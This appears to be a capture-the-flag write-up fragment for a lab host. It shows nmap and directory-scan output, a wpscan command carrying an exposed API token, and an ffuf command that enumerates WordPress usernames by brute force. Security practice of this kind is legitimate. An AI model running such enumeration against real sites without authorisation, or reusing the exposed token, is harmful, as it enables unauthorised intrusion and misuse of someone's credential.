___

```python
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 0d:e4:41:fd:9f:a9:07:4d:25:b4:bd:5d:26:cc:4f:da (RSA)  
|   256 f7:65:51:e0:39:37:2c:81:7f:b5:55:bd:63:9c:82:b5 (ECDSA)  
|_  256 28:61:d3:5a:b9:39:f2:5b:d7:10:5a:67:ee:81:a8:5e (ED25519)  
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
|_http-title: Root of the Universe &#8211; by @lydericlefebvre &amp; @akerva_fr  
|_http-generator: WordPress 5.4-alpha-47225  
5000/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)  
|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+  
|_http-title: Site doesnt have a title (text/html; charset=utf-8).  
| http-auth:    
| HTTP/1.0 401 UNAUTHORIZED\x0D  
|_  Basic realm=Authentication Required
```


# 80

WordPress 5.4

```
wpscan -e ap --plugins-detection aggressive --url http://$IP --api-token 5L1iakB9rnC4xBx5MHL1Tt42iwkbdFJsWDs3pd0ZjUY
```

Plugins
- akismet

```python
/.html                (Status: 403) [Size: 276]  
/index.php            (Status: 301) [Size: 0] [--> http://10.13.37.11/]  
/.php                 (Status: 403) [Size: 276]  
/wp-content           (Status: 301) [Size: 315] [--> http://10.13.37.11/wp-content/]  
/scripts              (Status: 401) [Size: 458]  
/wp-login.php         (Status: 200) [Size: 5036]  
/license.txt          (Status: 200) [Size: 19935]  
/wp-includes          (Status: 301) [Size: 316] [--> http://10.13.37.11/wp-includes/]  
/dev                  (Status: 301) [Size: 308] [--> http://10.13.37.11/dev/]  
/javascript           (Status: 301) [Size: 315] [--> http://10.13.37.11/javascript/]  
/readme.html          (Status: 200) [Size: 7278]  
/wp-trackback.php     (Status: 200) [Size: 135]  
/wp-admin             (Status: 301) [Size: 313] [--> http://10.13.37.11/wp-admin/]  
/backups              (Status: 301) [Size: 312] [--> http://10.13.37.11/backups/]  
/xmlrpc.php           (Status: 405) [Size: 42]  
/.php                 (Status: 403) [Size: 276]  
/.html                (Status: 403) [Size: 276]  
/wp-signup.php        (Status: 302) [Size: 0] [--> http://10.13.37.11/wp-login.php?action=register]
```



```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://10.13.37.11/wp-login.php -X POST -d "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.13.37.11%2Fwp-admin%2F&testcookie=1" -fr "Unknown username" -H "Content-Type: application/x-www-form-urlencoded"
```